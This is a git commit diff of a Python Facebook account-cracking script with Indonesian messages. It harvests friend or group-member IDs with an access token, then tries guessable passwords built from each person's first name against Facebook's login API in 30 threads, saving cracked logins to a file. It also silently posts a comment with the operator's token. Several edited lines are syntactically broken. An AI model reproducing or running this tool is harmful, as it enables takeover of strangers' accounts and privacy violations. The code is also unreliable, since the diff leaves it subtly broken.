5b1ec6b85eb5da934b71cf1192e3cf64fcbb1d1c
Susanto <50844272+M3DPR0@users.noreply.github.com>
2019-09-14 09:48:56 +0700

    Update Unik.py

--- Unik.py
+++ Unik.py
@@ -9,13 +9,9 @@ from time import sleep
 from getpass import getpass
 from multiprocessing.pool import ThreadPool
 
-
+s = requests.Session()
 url = "https://graph.facebook.com/{}"
 api="https://api.facebook.com/{}"
-headers={'"user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"'}
-s=requests.Session()
-
-
 
 target     = []
 found      = []
@@ -38,8 +34,8 @@ RE = "\033[0m"
 
 def login():
 	print("%s\n\n* login your account facebook first *\n"%(W))
-	email = input("%s [@]  %sUser     : "%(P,W))
-	pasw = getpass("%s[&]  %sPassword : "%(P,W))
+	email = input("%s[@]  %sUser     : "%(P,W))
+	pasw = getpass("%s[#]  %sPassword : "%(P,W))
 	
 	
 	
@@ -47,10 +43,10 @@ def login():
 	get(email,pasw)	
 #=================FORM TOKEN
 def     get(email,pasw):
-	print("%s[|]%s membuat kode masuk ..."%(P,W))
+	print("%s[*]%s membuat kode masuk ..."%(P,W))
 	b = open("cookie/token.log","w")
 	try:
-		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources":"0","v":"1.0"
 		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pasw,"return_ssl_resources":"0","v":"1.0"}
 		x = hashlib.new('md5')
 		x.update(sig.encode("utf-8"))
@@ -59,79 +55,20 @@ def     get(email,pasw):
 		if "access_token" in ok:
 			b.write(ok["access_token"])
 			b.close()
-			print("%s[☆]%s sukses membuat kode masuk..."%(G,W))
-			exit("%s[☆]%s kode disimpan di: cookie/token.log"%(G,W))
+			print("%s[¤]%s sukses membuat kode masuk..."%(G,W))
+			exit("%s[¤]%s kode disimpan di: cookie/token.log"%(G,W))
 		elif "www.facebook.com" in ok["error_msg"]:
 			os.system("rm -rf cookie")
-			print("%s[X]%s failed to generate access token !!"%(R,W))
-			exit("%s[X] %syour account checkpoint !!"%(R,W))
+			print("%s[!]%s failed to generate access token !!"%(R,W))
+			exit("%s[?] %syour account checkpoint !!"%(R,W))
 		else:
 			os.system("rm -rf cookie")
-			print("%s[X]%s failed to generate access token !!"%(R,W))
-			exit("%s[X] %swrong email or password !!"%(R,W))		
+			print("%s[!]%s failed to generate access token !!"%(R,W))
+			exit("%s[@] %swrong email or password !!"%(R,W))		
 	except requests.exceptions.ConnectionError:
-		print("%s[X] %sfailed to generate access token"%(R,W))
+		print("%s[!] %sfailed to generate access token"%(R,W))
 		exit("%s[X] %scheck your connection !!"%(R,W))
-def menu(n,toket):
-	global loop
-	loop=0
-	banner()
-	print("%s(●) %sHappy Cracking... %s%s"%(G,W,Y,n))
-	print("""
-%s## %s1 ID FROM YOUR LIST FRIEND
-%s## %s2 ID FROM FRIEND
-%s## %s3 ID FROM MEMBER GROUP
-%s## %s0 Exit the program
-"""%(G,W,G,W,G,W,G,R))
 
-
-	unikers = input("%s[ %schoose%s ]%s•>%s "%(W,G,W,G,W))
-	if unikers in [""]:
-		exit("%s[!]%s wrong input !!"%(R,W))
-    
-    
-	elif unikers in ["1"]:
-		print("\n%s[*]%s from : %s"%(P,W,n))
-    
-		for z in s.get(url.format("me/friends?access_token=%s"%(toket))).json()["data"]:
-			target.append(z["id"])
-      
-      
-	elif unikers in ["2"]:
-		try:
-			idf = input("\n%s[*] %sID friend : "%(P,W))
-			k = s.get(url.format(idf+"?access_token=%s"%(toket))).json()["name"]
-		except KeyError:
-			exit("%s[!]%s ups sorry friend not found !!"%(R,W))
-		print("%s[*]%s from : %s"%(P,W,k))
-    
-		for f in s.get(url.format(idf+"/friends?access_token=%s"%(toket))).json()["data"]:
-			target.append(f["id"])
-      
-      
-	elif unikers in ["3"]:
-		try:	
-			idg = input("\n%s[*]%s ID group : "%(P,W))
-			e = s.get(url.format("group/?id="+idg+"&access_token=%s"%(toket))).json()["name"]
-		except KeyError:
-			exit("%s[!]%s ups sorry group not found !!"%(R,W))
-		print("%s[*]%s from : %s"%(P,W,e))
-		for y in s.get(url.format(idg+"/members?fields=name,id&limit=4999&access_token=%s"%(toket))).json()["data"]:
-			target.append(y["id"])
-      
-      
-	elif unikers in ["0"]:
-		os.system("rm -rf cookie")
-		exit()
-	else:
-		exit("%s[!]%s wrong input !!"%(R,W))
-		
-	print("%s[*]%s Tunggu sebentar..."%(P,W))
-	
-	m = ThreadPool(30)
-	m.map(x,target)
-	result(found,checkpoint)
-	exit("%s\n[+] %sDone ... "%(R,W))
 def x(user):
 	global loop
 	try:
@@ -140,8 +77,8 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"01","@"+nama,"sayang","anjing","kontol","ngentot","gaspol","jablay"]:
-			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
+		for pas in [nama+"01",nama+"123",nama+"000",nama+"12345","@"+nama,]:
+			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=1302824299894917%de61215fbf16df9eb522f9244e770f11&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
 				found.append("%s | %s"%(user,pas))
@@ -189,7 +126,7 @@ def cek():
     
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100005584243934_1145924785603652/comments?message=['found.txt']&access_token=%s"%(toket)))
+		s.post(url.format("100005584243934_1145924785603652/comments?message=Kontol....&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
 		sleep(1)
 		menu(n,toket)
@@ -200,6 +137,68 @@ def cek():
 		login()
 	except requests.exceptions.ConnectionError:
 		exit("%s[!] %sups no connection !!"%(R,W))
+
+def menu(n,toket):
+	global loop
+	loop=0
+	banner()
+	print("%s(●) %sHappy Cracking... %s%s"%(G,W,Y,n))
+	print("""
+%s## %s1 ID FROM YOUR LIST FRIEND
+%s## %s2 ID FROM FRIEND
+%s## %s3 ID FROM MEMBER GROUP
+%s## %s0 Exit the program
+"""%(G,W,G,W,G,W,G,R))
+
+
+	unikers = input("%s[ %schoose%s ]%s•>%s "%(W,G,W,G,W))
+	if unikers in [""]:
+		exit("%s[!]%s wrong input !!"%(R,W))
+    
+    
+	elif unikers in ["1"]:
+		print("\n%s[*]%s from : %s"%(P,W,n))
+    
+		for z in s.get(url.format("me/friends?access_token=%s"%(toket,timeout=None))).json()["data"]:
+			target.append(z["id"])
+      
+      
+	elif unikers in ["2"]:
+		try:
+			idf = input("\n%s[*] %sID friend : "%(P,W))
+			k = s.get(url.format(idf+"?access_token=%s"%(toket,timeout=None))).json()["name"]
+		except KeyError:
+			exit("%s[!]%s ups sorry friend not found !!"%(R,W))
+		print("%s[*]%s from : %s"%(P,W,k))
+    
+		for f in s.get(url.format(idf+"/friends?access_token=%s"%(toket,timeout=None))).json()["data"]:
+			target.append(f["id"])
+      
+      
+	elif unikers in ["3"]:
+		try:	
+			idg = input("\n%s[*]%s ID group : "%(P,W))
+			e = s.get(url.format("group/?id="+idg+"&access_token=%s"%(toket,timeout=None))).json()["name"]
+		except KeyError:
+			exit("%s[!]%s ups sorry group not found !!"%(R,W))
+		print("%s[*]%s from : %s"%(P,W,e))
+		for y in s.get(url.format(idg+"/members?fields=name,id&limit=4999&access_token=%s"%(toket,timeout=None))).json()["data"]:
+			target.append(y["id"])
+      
+      
+	elif unikers in ["0"]:
+		os.system("rm -rf cookie")
+		exit()
+	else:
+		exit("%s[!]%s wrong input !!"%(R,W))
+		
+	print("%s[*]%s Tunggu sebentar..."%(P,W))
+	
+	m = ThreadPool(30)
+	m.map(x,target)
+	result(found,checkpoint)
+	exit("%s\n[+] %sDone ... "%(R,W))
+
 def banner():
 	os.system("clear")
 	print("""
@@ -211,5 +210,5 @@ def banner():
 %s║ %sGithub : %sHttps://github.com/SAN-Brother%s%s 
 ╭═══════════════════════════╮
 ╰═══════════════════════════╯
- """%(R,G,RM,RE,R,G,R,W,RM,RE,W,R,W,CM,RE,W,R,W,PM,RE,W))
+ """%(R,G,GB,RE,R,G,R,W,RM,RE,W,R,W,CM,RE,W,R,W,PM,RE,W))
 cek()
